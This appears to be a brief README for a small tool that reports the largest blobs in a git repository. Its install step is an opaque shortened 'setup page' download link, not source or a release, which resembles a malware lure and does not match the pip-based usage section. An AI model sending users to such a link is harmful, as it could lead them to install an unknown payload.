# Git Large Find

What blew up the .git folder.

Find the largest blobs in a git repo and print path and size.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

## What it does

- Top N blobs
- Path and size
- Optional pack hint
- Read-only

A repo is huge and blame is not obvious.

This lists the largest blobs with paths.

## Usage

```powershell
pip install -r requirements.txt
python main.py --help
```
